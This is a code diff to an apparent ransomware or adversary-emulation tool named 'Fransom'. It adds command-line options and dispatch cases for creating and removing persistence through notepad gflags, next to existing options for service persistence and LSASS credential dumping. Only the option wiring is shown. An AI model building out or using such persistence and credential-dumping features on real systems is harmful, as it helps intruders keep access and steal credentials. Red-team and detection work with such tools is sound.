@@ -89,6 +89,10 @@ namespace Fransom
             public bool CreateService { get; set; }
             [Option("remove-service", HelpText = "(Requires Admin privileges) Remove new service persistence.", Group = "arguments")]
             public bool RemoveService { get; set; }
+            [Option("create-notepad-gflags", HelpText = "(Requires Admin privileges) Persistence via notepad gflags.", Group = "arguments")]
+            public bool SetNotepadGflags { get; set; }
+            [Option("remove-notepad-gflags", HelpText = "(Requires Admin privileges) Remove notepad gflags persistence.", Group = "arguments")]
+            public bool RemoveNotepadGflags { get; set; }
             [Option("ps", HelpText = "Helper: List running processes.", Group = "arguments")]
             public bool ListProcesses { get; set; }
             [Option("domain-users", HelpText = "List domain users.", Group = "arguments")]
@@ -316,11 +320,22 @@ namespace Fransom
                 var p = new Persistence();
                 p.CreateService();
             }
+            if (options.SetNotepadGflags)
+            {
+                var p = new Persistence();
+                p.SetNotepadGflags();
+            }
+            if (options.RemoveNotepadGflags)
+            {
+                var p = new Persistence();
+                p.RemoveNotepadGflags();
+            }
             if (options.RemoveService)
             {
                 var p = new Persistence();
                 p.RemoveService();
             }
+
             if (options.DumpLsass)
             {
                 var d = new DumpLSASS();
@@ -535,6 +550,12 @@ namespace Fransom
                         break;
                     case "remove-service":
                         p.RemoveService();
+                        break;
+                    case "create-notepad-gflags":
+                        p.SetNotepadGflags();
+                        break;
+                    case "remove-notepad-gflags":
+                        p.RemoveNotepadGflags();
                         break;
                     case "ps":
                         e.EnumerateProcesses();
